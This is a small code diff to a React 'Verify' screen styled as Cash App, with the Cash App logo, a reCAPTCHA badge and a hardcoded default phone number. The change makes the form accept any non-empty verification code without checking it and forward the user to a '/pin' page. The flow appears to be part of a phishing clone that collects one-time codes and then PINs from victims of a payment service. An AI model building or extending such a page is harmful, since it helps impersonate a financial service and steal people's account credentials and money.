@@ -1,5 +1,5 @@
 import React, { useState } from 'react';
-import { useLocation } from 'react-router-dom';
+import { useLocation, useNavigate } from 'react-router-dom';
 import { HelpCircle } from 'lucide-react';
 import { CashAppLogo } from '../components/CashAppLogo';
 import { RecaptchaBadge } from '../components/RecaptchaBadge';
@@ -7,8 +7,16 @@ import { RecaptchaBadge } from '../components/RecaptchaBadge';
 export function Verify() {
   const [code, setCode] = useState('');
   const location = useLocation();
+  const navigate = useNavigate();
   const contact = location.state?.contact || '(209) 432-9317';
   const method = location.state?.method || 'phone';
+
+  const handleSubmit = (e: React.FormEvent) => {
+    e.preventDefault();
+    if (code.length > 0) {
+      navigate('/pin');
+    }
+  };
 
   return (
     <div className="min-h-screen bg-black text-white font-sans relative flex flex-col">
@@ -29,7 +37,7 @@ export function Verify() {
         </button>
 
         <form
-          onSubmit={(e) => e.preventDefault()}
+          onSubmit={handleSubmit}
           className="flex flex-col gap-8">
           
           <div className="border border-white rounded-xl p-4 flex items-center bg-black">
